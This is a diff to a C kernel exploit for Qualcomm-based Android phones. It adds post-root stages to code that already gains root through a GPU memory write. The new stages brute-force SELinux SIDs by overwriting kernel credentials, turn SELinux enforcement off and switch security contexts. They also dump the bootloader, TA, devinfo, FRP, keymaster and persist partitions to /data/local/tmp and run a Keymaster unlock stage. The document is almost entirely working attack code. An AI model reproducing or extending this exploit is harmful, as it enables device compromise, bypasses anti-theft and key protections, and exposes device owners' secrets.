@@ -12,6 +12,7 @@
 #include <sys/mman.h>
 #include <sys/prctl.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <unistd.h>
@@ -98,6 +99,10 @@ struct ctrl {
     volatile int qsee_status;
     volatile int daemon_abort;
     volatile int daemon_stage;
+    volatile int sec_probe_cand;
+    volatile int sec_probe_ready;
+    volatile int sec_probe_result;
+    volatile int sec_scan_stop;
     struct selinux_handoff_state handoff;
 };
 static struct ctrl *ctrls;
@@ -108,7 +113,120 @@ static int verbose = 1;
 static const struct target_profile *g_target;
 static unsigned char *g_km_current_buffer;
 static unsigned char *g_km_expected_buffer;
+#define SEC_LOG_SIZE (64 * 1024)
+static char *g_sec_log;
+#define SEC_DUMP_SIZE (48u << 20)
+#define SEC_DUMP_MAX 12
+#define SEC_SID_SCAN_MAX 200000
+struct sec_dump_hdr {
+    volatile int done;
+    volatile int count;
+    struct { char name[16]; long long offset; long long size; } ent[SEC_DUMP_MAX];
+};
+static unsigned char *g_dump_buf;
+static struct sec_dump_hdr *g_dump_hdr;
 static int g_km_write_mode;
+
+/* GPT parsing so a raw disk node (root/gpt block device) can stand in for
+ * the per-partition by-name nodes when only the raw node is permitted. */
+struct sec_gpt_ent { char name[40]; unsigned long long first, last; };
+static int sec_gpt_lbs;
+static struct sec_gpt_ent sec_gpt[128];
+static int sec_gpt_count;
+
+static int sec_gpt_load(int fd) {
+    unsigned char buf[512 + 4096];
+    int lbs = 0;
+    for (int cand = 512; cand <= 4096; cand *= 8) {
+        if (pread(fd, buf, sizeof buf, cand) < 92) continue;
+        if (!memcmp(buf, "EFI PART", 8)) { lbs = cand; break; }
+    }
+    if (!lbs) return -1;
+    unsigned long long ent_lba = 0;
+    unsigned int nent = 0, esz = 0;
+    memcpy(&ent_lba, buf + 0x48, 8);
+    memcpy(&nent, buf + 0x50, 4);
+    memcpy(&esz, buf + 0x54, 4);
+    if (nent > 128) nent = 128;
+    if (esz < 128 || esz > 4096) return -1;
+    unsigned char ent[4096];
+    if (esz > sizeof ent) return -1;
+    sec_gpt_count = 0;
+    for (unsigned int i = 0; i < nent; i++) {
+        if (pread(fd, ent, esz, (long long)(ent_lba * (unsigned)lbs) +
+                                      (long long)i * esz) != (ssize_t)esz)
+            break;
+        int zero = 1;
+        for (int b = 0; b < 16; b++) if (ent[b]) { zero = 0; break; }
+        if (zero) continue;
+        unsigned long long f = 0, l = 0;
+        memcpy(&f, ent + 0x20, 8);
+        memcpy(&l, ent + 0x28, 8);
+        char nm[40] = {0};
+        for (int c = 0; c < 36; c++) {
+            unsigned short u;
+            memcpy(&u, ent + 0x38 + c * 2, 2);
+            if (!u) break;
+            nm[c] = (char)u;
+        }
+        snprintf(sec_gpt[sec_gpt_count].name, 40, "%s", nm);
+        sec_gpt[sec_gpt_count].first = f;
+        sec_gpt[sec_gpt_count].last = l;
+        sec_gpt_count++;
+    }
+    sec_gpt_lbs = lbs;
+    return sec_gpt_count > 0 ? 0 : -1;
+}
+
+static int g_sec_rawfd = -1;
+
+static long long sec_dump_partition(const char *name, unsigned char *dst,
+                                    long long cap) {
+    char p[96];
+    snprintf(p, sizeof p, "/dev/block/by-name/%s", name);
+    int fd = open(p, O_RDONLY);
+    long long total = 0;
+    if (fd >= 0) {
+        while (total < cap) {
+            size_t want = (size_t)(cap - total);
+            if (want > (1u << 20)) want = 1u << 20;
+            ssize_t r = read(fd, dst + total, want);
+            if (r <= 0) break;
+            total += r;
+        }
+        close(fd);
+        return total;
+    }
+    if (g_sec_rawfd < 0) {
+        static const char *raws[] = {"/dev/block/sda", "/dev/block/sdb",
+                                      "/dev/block/sdc", NULL};
+        for (int i = 0; raws[i]; i++) {
+            int r = open(raws[i], O_RDONLY);
+            if (r < 0) continue;
+            if (sec_gpt_load(r) == 0) {
+                g_sec_rawfd = r;
+                break;
+            }
+            close(r);
+        }
+    }
+    if (g_sec_rawfd < 0)
+        return -1;
+    for (int i = 0; i < sec_gpt_count; i++) {
+        if (strcmp(sec_gpt[i].name, name))
+            continue;
+        long long off = (long long)sec_gpt[i].first * sec_gpt_lbs;
+        while (total < cap) {
+            size_t want = (size_t)(cap - total);
+            if (want > (1u << 20)) want = 1u << 20;
+            ssize_t r = pread(g_sec_rawfd, dst + total, want, off + total);
+            if (r <= 0) break;
+            total += r;
+        }
+        return total;
+    }
+    return -2;
+}
 static cpu_set_t g_allowed_cpus;
 static cpu_set_t g_park_mask;
 static int g_park_cpu = -1;
@@ -532,6 +650,14 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
          * keep the patched task alive: selinux_task_free() would otherwise
          * kfree() an interior pointer and take the kernel down. */
         (void)prctl(PR_SET_PDEATHSIG, 0, 0, 0, 0);
+        if (g_sec_log) {
+            FILE *lf = fmemopen(g_sec_log, SEC_LOG_SIZE, "w");
+            if (lf) {
+                setvbuf(lf, NULL, _IONBF, 0);
+                stdout = lf;
+                stderr = lf;
+            }
+        }
         int cf = open("/proc/self/attr/current", O_RDONLY);
         if (cf >= 0) {
             char ctx[128] = {0};
@@ -544,8 +670,190 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
                 close(of);
             }
         }
+        if (getenv("SEC_DUMP")) {
+            /* With SID 1 the block devices are readable. Dump the bootloader
+             * and the TA/devinfo state, then try to turn enforcing off. */
+            static const char *parts[] = {
+                "abl_a", "abl_b", "xbl_a", "xbl_b", "devinfo", "frp",
+                "TA", "misc", "keymaster_a", "persist", NULL
+            };
+            static unsigned char buf[1 << 20];
+            char line[160];
+            int rf = open("/data/local/tmp/sec_dump.txt",
+                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (rf >= 0) (void)!write(rf, "start\n", 6);
+            for (int pi = 0; parts[pi]; pi++) {
+                char src[96], dst[96];
+                snprintf(src, sizeof src, "/dev/block/by-name/%s", parts[pi]);
+                snprintf(dst, sizeof dst, "/data/local/tmp/dump_%s.img", parts[pi]);
+                int in = open(src, O_RDONLY);
+                int out = in >= 0 ? open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644) : -1;
+                long long total = -1;
+                if (in >= 0 && out >= 0) {
+                    total = 0;
+                    ssize_t r;
+                    while ((r = read(in, buf, sizeof buf)) > 0) {
+                        ssize_t off = 0;
+                        while (off < r) {
+                            ssize_t w = write(out, buf + off, (size_t)(r - off));
+                            if (w <= 0) break;
+                            off += w;
+                        }
+                        total += off;
+                    }
+                }
+                if (in >= 0) close(in);
+                if (out >= 0) close(out);
+                if (rf >= 0) {
+                    int n = snprintf(line, sizeof line, "%s %lld\n",
+                                     parts[pi], total);
+                    if (n > 0) (void)!write(rf, line, (size_t)n);
+                }
+            }
+            int ef = open("/sys/fs/selinux/enforce", O_WRONLY);
+            if (ef >= 0) {
+                ssize_t w = write(ef, "0", 1);
+                if (rf >= 0) {
+                    int n = snprintf(line, sizeof line, "enforce_off %zd\n", w);
+                    if (n > 0) (void)!write(rf, line, (size_t)n);
+                }
+                close(ef);
+            }
+            if (rf >= 0) close(rf);
+        }
+        const char *sc = getenv("SEC_SETCON");
+        if (sc && *sc) {
+            int cfd = open("/proc/self/attr/current", O_WRONLY);
+            if (cfd >= 0) {
+                ssize_t w = write(cfd, sc, strlen(sc));
+                int e = errno;
+                printf("[setcon] %s write=%zd errno=%d\n", sc, w, w < 0 ? e : 0);
+                close(cfd);
+            } else {
+                printf("[setcon] open errno=%d\n", errno);
+            }
+            int rfd = open("/proc/self/attr/current", O_RDONLY);
+            if (rfd >= 0) {
+                char cur[128] = {0};
+                ssize_t r = read(rfd, cur, sizeof(cur) - 1);
+                close(rfd);
+                printf("[setcon] now=%.*s\n", r > 0 ? (int)r : 0, cur);
+            }
+        }
+        if (getenv("SEC_CONTEXT")) {
+            int xfd = open("/sys/fs/selinux/context", O_RDWR);
+            if (xfd >= 0) {
+                ssize_t w = write(xfd, "u:r:vendor_hal_keymaster_qti:s0", 32);
+                char rb[256] = {0};
+                ssize_t r = read(xfd, rb, sizeof(rb) - 1);
+                printf("[context] write=%zd read=%zd [%s]\n", w, r, rb);
+                close(xfd);
+            } else {
+                printf("[context] open errno=%d\n", errno);
+            }
+        }
+        if (getenv("SEC_EXECPROBE")) {
+            pid_t ep = fork();
+            if (ep == 0) {
+                char *nargv[] = {(char *)"true", NULL};
+                execve("/system/bin/true", nargv, environ);
+                _exit(errno ? errno : 1);
+            }
+            int est = 0;
+            if (ep > 0) {
+                waitpid(ep, &est, 0);
+                printf("[exec] status=%d exited=%d code=%d\n", est,
+                       WIFEXITED(est) ? 1 : 0,
+                       WIFEXITED(est) ? WEXITSTATUS(est) : -1);
+            }
+        }
+        if (getenv("SEC_SETEXEC")) {
+            int xf = open("/proc/self/attr/exec", O_WRONLY);
+            if (xf >= 0) {
+                const char *sc2 = getenv("SEC_SETEXEC");
+                ssize_t w = write(xf, sc2, strlen(sc2));
+                int e = errno;
+                printf("[setexec] %s write=%zd errno=%d\n",
+                       sc2, w, w < 0 ? e : 0);
+                close(xf);
+            } else {
+                printf("[setexec] open errno=%d\n", errno);
+            }
+        }
+        if (getenv("SEC_PROBE")) {
+            static const char *pp[] = {"/dev/ion", "/dev/qseecom",
+                "/dev/block/by-name/abl_a", "/vendor/lib64/libQSEEComAPI.so",
+                "/data/local/tmp/libQSEEComAPI.so", "/sys/fs/selinux/policy",
+                "/sys/fs/selinux/load", NULL};
+            for (int i = 0; pp[i]; i++) {
+                int fd = open(pp[i], O_RDONLY);
+                int e = errno;
+                printf("[probe] %s open=%d errno=%d\n", pp[i], fd,
+                       fd < 0 ? e : 0);
+                if (fd >= 0) close(fd);
+            }
+            int ef = open("/sys/fs/selinux/enforce", O_WRONLY);
+            if (ef >= 0) {
+                ssize_t w = write(ef, "0", 1);
+                int e = errno;
+                printf("[probe] enforce write=%zd errno=%d\n", w, w < 0 ? e : 0);
+                close(ef);
+            } else {
+                printf("[probe] enforce open errno=%d\n", errno);
+            }
+            fflush(NULL);
+        }
+        if (getenv("SEC_SIDSCAN")) {
+            while (!ctrls[idx].sec_scan_stop) {
+                if (!ctrls[idx].sec_probe_ready) {
+                    __asm__ volatile("yield" ::: "memory");
+                    continue;
+                }
+                static const char *paths[] = {
+                    "/dev/sg0", "/dev/block/sda",
+                    "/dev/block/by-name/abl_a", "/dev/block/by-name/xbl_a",
+                    "/dev/qseecom", "/sys/fs/selinux/load", NULL};
+                int mask = 0;
+                for (int pi = 0; paths[pi] && pi < 8; pi++) {
+                    int fd = open(paths[pi], O_RDONLY);
+                    if (fd >= 0) { mask |= 1 << pi; close(fd); }
+                }
+                ctrls[idx].sec_probe_result = mask;
+                __sync_synchronize();
+                ctrls[idx].sec_probe_ready = 0;
+            }
+            printf("[scan] stop, final sid applied\n");
+            fflush(NULL);
+        }
+        if (g_dump_buf && g_dump_hdr) {
+            static const char *parts[] = {"abl_a", "xbl_a", "devinfo", "frp",
+                                          "TA", "misc", NULL};
+            long long off = 0;
+            for (int pi = 0; parts[pi] && pi < SEC_DUMP_MAX; pi++) {
+                if (off >= (long long)SEC_DUMP_SIZE)
+                    break;
+                long long total = sec_dump_partition(parts[pi], g_dump_buf + off,
+                                                     (long long)SEC_DUMP_SIZE - off);
+                if (total <= 0)
+                    continue;
+                struct sec_dump_hdr *h = g_dump_hdr;
+                int slot = h->count;
+                if (slot < SEC_DUMP_MAX) {
+                    strncpy(h->ent[slot].name, parts[pi], 15);
+                    h->ent[slot].name[15] = 0;
+                    h->ent[slot].offset = off;
+                    h->ent[slot].size = total;
+                    __sync_synchronize();
+                    h->count = slot + 1;
+                }
+                off += (total + 0xFFF) & ~0xFFFLL;
+            }
+            __sync_synchronize();
+            g_dump_hdr->done = 1;
+        }
         if (getenv("KM_UNLOCK_MODE")) {
             ctrls[idx].qsee_status = run_kmunlock_tool();
+            fflush(NULL);
             __sync_synchronize();
             ctrls[idx].qsee_done = 1;
             futex_wake_int(&ctrls[idx].qsee_done);
@@ -1764,6 +2072,26 @@ int main(int argc, char **argv) {
         g_pressure_bytes = (size_t)configured * 1024 * 1024;
     printf("[*] spray profile children=%d pressure=%zu MiB\n",
            g_child_count, g_pressure_bytes / (1024 * 1024));
+    if (sec_sid_mode && getenv("SEC_LOG")) {
+        void *log = mmap(NULL, SEC_LOG_SIZE, PROT_READ | PROT_WRITE,
+                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+        if (log != MAP_FAILED) {
+            memset(log, 0, SEC_LOG_SIZE);
+            g_sec_log = log;
+        }
+    }
+    if (sec_sid_mode && getenv("SEC_DUMP2")) {
+        void *dbuf = mmap(NULL, SEC_DUMP_SIZE, PROT_READ | PROT_WRITE,
+                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+        void *dhdr = mmap(NULL, sizeof(struct sec_dump_hdr),
+                          PROT_READ | PROT_WRITE,
+                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+        if (dbuf != MAP_FAILED && dhdr != MAP_FAILED) {
+            memset(dhdr, 0, sizeof(struct sec_dump_hdr));
+            g_dump_buf = dbuf;
+            g_dump_hdr = dhdr;
+        }
+    }
 
     ctrls = mmap(NULL, sizeof(struct ctrl) * (size_t)g_child_count,
                  PROT_READ | PROT_WRITE,
@@ -1976,11 +2304,131 @@ int main(int argc, char **argv) {
     }
     printf("[+] child %d verified uid/euid/gid/egid 0\n", root_child.pid);
     mark("root verified");
+    if (sec_sid_mode && getenv("SEC_SIDSCAN") && forged_security) {
+        int blk = 0, qse = 0, ctl = 0;
+        for (int cand = 1; cand <= SEC_SID_SCAN_MAX && !blk; cand++) {
+            uint32_t ids[2] = {(uint32_t)cand, (uint32_t)cand};
+            if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                                forged_security, ids, 2) < 0)
+                break;
+            ctrls[root_child.idx].sec_probe_result = -1;
+            ctrls[root_child.idx].sec_probe_cand = cand;
+            __sync_synchronize();
+            ctrls[root_child.idx].sec_probe_ready = 1;
+            int ok = -1;
+            for (int w = 0; w < 500; w++) {
+                __sync_synchronize();
+                if (ctrls[root_child.idx].sec_probe_result >= 0) {
+                    ok = ctrls[root_child.idx].sec_probe_result;
+                    break;
+                }
+                usleep(10000);
+            }
+            if ((cand & 8191) == 0)
+                printf("[scan] progress %d\n", cand);
+            if (ok <= 0)
+                continue;
+            if ((ok & 0x3c) && !ctl) {
+                ctl = cand;
+                printf("[ctl] SID %d opens qseecom/load mask=0x%x\n", cand, ok);
+            }
+            if ((ok & 0x0f) && !blk) {
+                blk = cand;
+                printf("[+] SID %d opens a disk node mask=0x%x\n", cand, ok);
+            }
+            if ((ok & 0x02) && !qse) {
+                qse = cand;
+                printf("[+] SID %d opens /dev/qseecom\n", cand);
+            }
+        }
+        int final = blk ? blk : (qse ? qse : 1);
+        uint32_t final_ids[2] = {(uint32_t)final, (uint32_t)final};
+        (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                              forged_security, final_ids, 2);
+        __sync_synchronize();
+        ctrls[root_child.idx].sec_scan_stop = 1;
+        printf("[scan] control=%d block=%d qseecom=%d final=%d\n",
+               ctl, blk, qse, final);
+        if (!blk)
+            printf("[-] no SID in 1..%d could open a block device\n",
+                   SEC_SID_SCAN_MAX);
+    }
+
+    if (sec_sid_mode && getenv("SEC_DUMP2") && g_dump_hdr) {
+        int waited = 0;
+        while (!g_dump_hdr->done && waited < 180000) {
+            usleep(50000);
+            waited += 50;
+        }
+        if (g_sec_log && *g_sec_log)
+            printf("[child log]\n%s\n", g_sec_log);
+        if (!g_dump_hdr->done) {
+            printf("[-] partition dump did not complete\n");
+        } else {
+            int dfd = open("/data/local/tmp/dump_all.bin",
+                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (dfd >= 0) {
+                (void)!write(dfd, g_dump_buf, SEC_DUMP_SIZE);
+                close(dfd);
+            }
+            int mf = open("/data/local/tmp/dump_all.txt",
+                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            for (int i = 0; i < g_dump_hdr->count; i++) {
+                char line[128];
+                int n = snprintf(line, sizeof line, "%s %lld %lld\n",
+                                 g_dump_hdr->ent[i].name,
+                                 g_dump_hdr->ent[i].offset,
+                                 g_dump_hdr->ent[i].size);
+                if (n > 0) {
+                    if (mf >= 0) (void)!write(mf, line, (size_t)n);
+                    printf("[dump] %s", line);
+                }
+            }
+            if (mf >= 0) close(mf);
+            printf("[+] dump written (%d partitions)\n", g_dump_hdr->count);
+        }
+    }
 
     if (run_kmunlock) {
         struct selinux_handoff_state *handoff =
             &ctrls[root_child.idx].handoff;
         int qsee_status = 1;
+        if (sec_sid_mode) {
+            /* The child already has SID 1 and calls the QSEECom client
+             * itself; no handoff is involved. */
+            int st = wait_for_qsee(root_child.idx, 300000);
+            qsee_status = st < 0 ? (errno ? errno : ETIMEDOUT) : st;
+            if (g_sec_log && *g_sec_log)
+                printf("[child log]\n%s\n", g_sec_log);
+            if (g_dump_hdr && g_dump_hdr->done) {
+                int dfd = open("/data/local/tmp/dump_all.bin",
+                               O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                if (dfd >= 0) {
+                    (void)!write(dfd, g_dump_buf, SEC_DUMP_SIZE);
+                    close(dfd);
+                }
+                int mf = open("/data/local/tmp/dump_all.txt",
+                              O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                if (mf >= 0) {
+                    char line[128];
+                    for (int i = 0; i < g_dump_hdr->count; i++) {
+                        int n = snprintf(line, sizeof line, "%s %lld %lld\n",
+                                         g_dump_hdr->ent[i].name,
+                                         g_dump_hdr->ent[i].offset,
+                                         g_dump_hdr->ent[i].size);
+                        if (n > 0) (void)!write(mf, line, (size_t)n);
+                    }
+                    close(mf);
+                }
+                printf("[+] dump written (%d partitions)\n", g_dump_hdr->count);
+            }
+            if (qsee_status)
+                fprintf(stderr, "[-] SEC_SID Keymaster stage status=%d\n",
+                        qsee_status);
+            else
+                printf("[+] SEC_SID Keymaster stage returned success\n");
+            goto km_stage_done;
+        }
         int child_ready = wait_for_handoff(root_child.idx, &handoff->ready,
                                            10000) == 0;
         if (!child_ready) {
@@ -2052,6 +2500,7 @@ int main(int argc, char **argv) {
             }
         }
 
+    km_stage_done:
         if (qsee_status == 0 && !g_km_write_mode) {
             if (keymaster_device_state_save_backup(
                     KM_BACKUP_PATH, g_km_current_buffer,
